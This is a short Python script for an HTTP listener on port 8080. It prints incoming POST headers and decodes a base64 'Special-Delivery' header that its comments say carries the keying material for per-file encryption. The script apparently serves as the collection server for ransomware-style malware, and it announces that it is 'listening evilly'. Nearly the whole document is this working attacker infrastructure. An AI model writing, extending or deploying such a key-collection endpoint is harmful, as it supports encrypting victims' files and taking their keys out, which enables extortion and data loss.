import http.server
import socketserver
import base64

PORT = 8080

# Sits and listens for POST requests to 8080
# The keying material (that we need) is in
# the RFC-compliant Special-Delivery header

# Per file encryption as follows: SHA256(random key + absolute file path + ownership)*X iterations
class Handler(http.server.SimpleHTTPRequestHandler):
  def do_POST(self):
    print("----HEADERS----")
    for header, value in self.headers.items():
      print(f"{header}: {value}")
    print("--------------")
    print(base64.b64decode(self.headers["Special-Delivery"]).decode('ascii'))
    print("--------------")
with socketserver.TCPServer(("",PORT), Handler) as httpd:
  print(f"Listening evilly at port {PORT}")
  httpd.serve_forever()
